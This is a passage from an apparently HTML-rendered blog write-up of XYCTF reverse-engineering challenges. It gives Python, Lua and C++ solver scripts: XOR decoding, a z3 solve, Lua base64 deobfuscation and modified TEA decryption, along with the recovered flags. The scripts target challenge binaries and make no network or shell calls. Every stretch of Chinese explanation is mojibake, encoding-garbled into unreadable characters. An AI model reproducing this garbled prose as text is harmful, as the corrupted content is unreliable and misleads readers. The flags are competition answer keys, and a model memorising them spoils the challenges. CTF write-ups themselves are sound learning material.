class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">4</span>==<span class="number">0</span>):</span><br><span class="line">        enc[i]-=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">1</span>):</span><br><span class="line">        enc[i]+=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">2</span>):</span><br><span class="line">        enc[i]//=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">3</span>):</span><br><span class="line">        enc[i]^=i</span><br><span class="line">pl(enc)</span><br><span class="line"><span class="comment"># XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ç ¸æ ¸æ¡ƒ">ç ¸æ ¸æ¡ƒ</h4><p>æŸ¥ä¸€ä¸‹å£³æ˜¯nspackï¼Œç›´æ¥æ‰¾ä¸ªå·¥å…·è„±äº†</p><p>ç„¶åæ‰“å¼€ã€‚åˆæ˜¯å¾ˆç®€å•çš„é€»è¾‘,ç›´æ¥å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = <span class="string">&#x27;this_is_not_flag&#x27;</span></span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>, <span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line">pxor(last,k)</span><br><span class="line"><span class="comment"># flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h3 id="week3">week3</h3><h4 id="ez-enc">ez_enc</h4><p>æ‰“å¼€mainï¼Œæ˜¯ä¸€ä¸ªç®€å•çš„å¸¦modçš„åŠ å¯†ï¼Œæ—¢ç„¶æ˜¯å‰ä¸€ä¸ªæ•°æ®å’Œåä¸€ä¸ªæ•°æ®æœ‰å…³ç³»ï¼Œè¿˜ä¸å¤§ï¼Œç›´æ¥z3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;IMouto&#x27;</span></span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x17</span>, <span class="number">0x0B</span>, <span class="number">0x50</span>, <span class="number">0x03</span>, <span class="number">0xC8</span>, <span class="number">0x0C</span>, </span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0x55</span>, <span class="number">0xCB</span>, <span class="number">0x2D</span>, <span class="number">0xE9</span>, <span class="number">0x32</span>, </span><br><span class="line">        <span class="number">0x0E</span>, <span class="number">0x11</span>, <span class="number">0x26</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x07</span>, <span class="number">0xFC</span>, <span class="number">0x27</span>, </span><br><span class="line">        <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0xED</span>, <span class="number">0x35</span>, <span class="number">0x59</span>, <span class="number">0xEB</span>, <span class="number">0x3C</span>, <span class="number">0x3E</span>, </span><br><span class="line">        <span class="number">0xE4</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line">out,flag = zini(<span class="number">34</span>)</span><br><span class="line">f = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    f.add(last[i]==(<span class="built_in">ord</span>(key[i%<span class="number">6</span>])^out[i+<span class="number">1</span>]+out[i] % <span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">isflag(f,flag)</span><br><span class="line">zcheck(f,flag)</span><br><span class="line"><span class="comment"># flag&#123;!_r3ea11y_w4nt_@_cu7e_s1$ter&#125;</span></span><br></pre></td></tr></table></figure><h4 id="whatâ€™s-this">whatâ€™s this</h4><p>æ˜¯luaçš„å­—èŠ‚ç ï¼Œæ”¾åˆ°åœ¨çº¿è§£ç é‡Œé¢è§£ç ï¼Œæ¥å‡ºæ¥å°±æ˜¯æ­£å¸¸çš„luaä»£ç ï¼Œ</p><p>å‰é¢æ˜¯ä¸€å †æ··æ·†çš„å‡½æ•°ï¼Œæœ€åæ˜¯çœŸçš„ä»£ç ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ª</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Xor</span><span class="params">(num1, num2)</span></span></span><br><span class="line">  <span class="keyword">local</span> tmp1 = num1</span><br><span class="line">  <span class="keyword">local</span> tmp2 = num2</span><br><span class="line">  <span class="keyword">local</span> str = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">repeat</span></span><br><span class="line">    <span class="keyword">local</span> s1 = tmp1 % <span class="number">2</span></span><br><span class="line">    <span class="keyword">local</span> s2 = tmp2 % <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> s1 == s2 <span class="keyword">then</span></span><br><span class="line">      str = <span class="string">&quot;0&quot;</span> .. str</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      str = <span class="string">&quot;1&quot;</span> .. str</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tmp1 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp1 / <span class="number">2</span>)</span><br><span class="line">    tmp2 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp2 / <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">until</span> tmp1 == <span class="number">0</span> <span class="keyword">and</span> tmp2 == <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">tonumber</span>(str, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">output</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">local</span> temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(flag, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(Xor(temp, <span class="number">8</span>) % <span class="number">256</span>)</span><br><span class="line">  value = value .. temp</span><br><span class="line">  i = i + <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> i &gt; <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">1000</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">3</span></span><br><span class="line">  y = x * <span class="number">3</span></span><br><span class="line">  z = y / <span class="number">4</span></span><br><span class="line">  w = z - <span class="number">5</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(value, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp + <span class="number">3</span>)</span><br><span class="line">  <span class="built_in">output</span> = <span class="built_in">output</span> .. temp</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">result = <span class="built_in">output</span>:<span class="built_in">rep</span>(<span class="number">10</span>)</span><br><span class="line">invalid_list = &#123;</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">  <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">20</span> <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(invalid_list, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">50</span> <span class="keyword">do</span></span><br><span class="line">  result = result .. <span class="string">&quot;A&quot;</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(invalid_list, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(<span class="built_in">output</span>) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(<span class="built_in">output</span>, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">30</span> <span class="keyword">do</span></span><br><span class="line">  result = result .. <span class="built_in">string</span>.<span class="built_in">lower</span>(<span class="built_in">output</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">950</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">3</span></span><br><span class="line">  y = x * <span class="number">3</span></span><br><span class="line">  z = y / <span class="number">4</span></span><br><span class="line">  w = z - <span class="number">5</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">50</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">-1</span></span><br><span class="line">  y = x * <span class="number">4</span></span><br><span class="line">  z = y / <span class="number">2</span></span><br><span class="line">  w = z - <span class="number">3</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will also never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">obfuscated_output = to_base64(<span class="built_in">output</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">reverse</span>(obfuscated_output)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">invalid_variable = obfuscated_output:<span class="built_in">rep</span>(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> obfuscated_output == <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span> <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;You get the flag.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;F**k!&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹æ˜¯base64åŠ æ¢å­—åŠ ä¸€äº›å¥‡æ€ªçš„åŠ å¯†ï¼Œé‚£ä¸¢ç»™chatgpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Xor</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 ^ num2</span><br><span class="line"></span><br><span class="line">obfuscated_output = <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span></span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;g&quot;</span>).replace(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;H&quot;</span>).replace(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;W&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line">output = base64.b64decode(obfuscated_output).decode()</span><br><span class="line"></span><br><span class="line">value = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> output:</span><br><span class="line">    temp = <span class="built_in">ord</span>(char) - <span class="number">3</span></span><br><span class="line">    value += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> value:</span><br><span class="line">    temp = Xor(<span class="built_in">ord</span>(char), <span class="number">8</span>) % <span class="number">256</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ez-math">ez_math</h4><p>æ˜¯pythonçš„æ··æ·†ï¼Œè¿˜æ²¡æœ‰å·¥å…·ï¼Œç”¨ç¾åŒ–å·¥å…·ç¾åŒ–ä¸€ä¸‹ï¼Œè¿˜æ˜¯å¯ä»¥ç†è§£ï¼Œå¤§æ¦‚å°±æ˜¯æŠŠa*b sumäº†ä¸€ä¸‹ï¼Œæœ€åå†åŒ–ç®€ä¸€æ‰‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">32</span> <span class="keyword">and</span> (</span><br><span class="line">    (flag[<span class="number">0</span>] * (flag[<span class="number">0</span>] - <span class="number">176</span>)) +</span><br><span class="line">    (flag[<span class="number">1</span>] * (flag[<span class="number">1</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">2</span>] * (flag[<span class="number">2</span>] - <span class="number">134</span>)) +</span><br><span class="line">    (flag[<span class="number">3</span>] * (flag[<span class="number">3</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">4</span>] * (flag[<span class="number">4</span>] - <span class="number">140</span>)) +</span><br><span class="line">    (flag[<span class="number">5</span>] * (flag[<span class="number">5</span>] - <span class="number">246</span>)) +</span><br><span class="line">    (flag[<span class="number">6</span>] * (flag[<span class="number">6</span>] - <span class="number">226</span>)) +</span><br><span class="line">    (flag[<span class="number">7</span>] * (flag[<span class="number">7</span>] - <span class="number">110</span>)) +</span><br><span class="line">    (flag[<span class="number">8</span>] * (flag[<span class="number">8</span>] - <span class="number">174</span>)) +</span><br><span class="line">    (flag[<span class="number">9</span>] * (flag[<span class="number">9</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">10</span>] * (flag[<span class="number">10</span>] - <span class="number">142</span>)) +</span><br><span class="line">    (flag[<span class="number">11</span>] * (flag[<span class="number">11</span>] - <span class="number">230</span>)) +</span><br><span class="line">    (flag[<span class="number">12</span>] * (flag[<span class="number">12</span>] - <span class="number">198</span>)) +</span><br><span class="line">    (flag[<span class="number">13</span>] * (flag[<span class="number">13</span>] - <span class="number">170</span>)) +</span><br><span class="line">    (flag[<span class="number">14</span>] * (flag[<span class="number">14</span>] - <span class="number">234</span>)) +</span><br><span class="line">    (flag[<span class="number">15</span>] * (flag[<span class="number">15</span>] - <span class="number">224</span>)) +</span><br><span class="line">    (flag[<span class="number">16</span>] * (flag[<span class="number">16</span>] - <span class="number">232</span>)) +</span><br><span class="line">    (flag[<span class="number">17</span>] * (flag[<span class="number">17</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">18</span>] * (flag[<span class="number">18</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">19</span>] * (flag[<span class="number">19</span>] - <span class="number">176</span>)) +</span><br><span class="line">    (flag[<span class="number">20</span>] * (flag[<span class="number">20</span>] - <span class="number">212</span>)) +</span><br><span class="line">    (flag[<span class="number">21</span>] * (flag[<span class="number">21</span>] - <span class="number">220</span>)) +</span><br><span class="line">    (flag[<span class="number">22</span>] * (flag[<span class="number">22</span>] - <span class="number">212</span>)) +</span><br><span class="line">    (flag[<span class="number">23</span>] * (flag[<span class="number">23</span>] - <span class="number">150</span>)) +</span><br><span class="line">    (flag[<span class="number">24</span>] * (flag[<span class="number">24</span>] - <span class="number">222</span>)) +</span><br><span class="line">    (flag[<span class="number">25</span>] * (flag[<span class="number">25</span>] - <span class="number">242</span>)) +</span><br><span class="line">    (flag[<span class="number">26</span>] * (flag[<span class="number">26</span>] - <span class="number">170</span>)) +</span><br><span class="line">    (flag[<span class="number">27</span>] * (flag[<span class="number">27</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">28</span>] * (flag[<span class="number">28</span>] - <span class="number">150</span>)) +</span><br><span class="line">    (flag[<span class="number">29</span>] * (flag[<span class="number">29</span>] - <span class="number">232</span>)) +</span><br><span class="line">    (flag[<span class="number">30</span>] * (flag[<span class="number">30</span>] - <span class="number">142</span>)) +</span><br><span class="line">    (flag[<span class="number">31</span>] * (flag[<span class="number">31</span>] - <span class="number">250</span>)) + <span class="number">297412</span> == <span class="number">0</span></span><br><span class="line">):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œæ¯ä¸€è¡Œåé¢å‡çš„æ•°é™¤ä»¥äºŒå°±æ˜¯flag</p><p>é‚£å°±ç›´æ¥é™¤ä»¥äºŒ</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;q7WYGscUuptTYXjnjKoyUTKtG&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ç»™é˜¿å§¨å€’ä¸€æ¯å¡å¸ƒå¥‡è¯º">ç»™é˜¿å§¨å€’ä¸€æ¯å¡å¸ƒå¥‡è¯º</h4><p>æ˜¯ä¸€ä¸ªç®€å•çš„teaï¼Œé­”æ”¹çš„éƒ¨åˆ†æ˜¯ä¸€å¼€å§‹çš„data1å’Œdata2çš„å¼‚æˆ–</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> i;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">data1 ^= *v;</span><br><span class="line">data2 ^= v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">1853174124</span>;</span><br><span class="line">data1 += ((data2 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (data2 + sum) ^ (*k + <span class="number">16</span> * data2) ^ (sum + i);</span><br><span class="line">data2 += ((data1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (data1 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * data1) ^ (sum + i);</span><br><span class="line">&#125;</span><br><span class="line">*v = data1;</span><br><span class="line">v[<span class="number">1</span>] = data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿˜æ˜¯ç›¸å½“äºæŠŠä¼ å…¥å½“keyï¼Œdata1å’Œ2æ›´åƒæ˜¯åŠ å¯†çš„å€¼ï¼Œè¦è§£å¯†ç›´æ¥åœ¨æœ€åå¼‚æˆ–ä¸Šå‰ä¸€ä¸ªçš„æœ€åå€¼å°±å‡ºæ¥äº†ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0x6E75316C</span> * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">data1 = *v;</span><br><span class="line">data2 = v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0x1f</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">data2 -= ((data1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (data1 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * data1) ^ (sum + i);</span><br><span class="line">data1 -= ((data2 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (data2 + sum) ^ (*k + <span class="number">16</span> * data2) ^ (sum + i);</span><br><span class="line">sum -= <span class="number">0x6E75316C</span>;</span><br><span class="line">&#125;</span><br><span class="line">*v = *(v - <span class="number">2</span>) ^ data1;</span><br><span class="line">v[<span class="number">1</span>] = *(v - <span class="number">1</span>) ^ data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ³¨æ„iè¦æ˜¯åç€çš„ï¼Œå› ä¸ºåŠ å¯†çš„æ—¶å€™ç”¨äº†i</p><p>å‡ºæ¥æ˜¯</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">62333331</span></span><br><span class="line"><span class="number">34656666</span></span><br><span class="line"><span class="number">32643130</span></span><br><span class="line"><span class="number">30613332</span></span><br><span class="line"><span class="number">35383332</span></span><br><span class="line"><span class="number">63303964</span></span><br><span class="line"><span class="number">63316635</span></span><br><span class="line"><span class="number">37373361</span></span><br></pre></td></tr></table></figure><p>è½¬æˆå­—ç¬¦å†ç”¨xyctfåŒ…èµ·æ¥(é¢˜ç›®è¯´çš„æ˜¯flag{}ä½†æ˜¯è¯•äº†ä¸è¡Œ)ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">133</span>bffe401d223a02385d90c5f1ca377&#125;</span><br></pre></td></tr></table></figure><h4 id="easy-language">easy 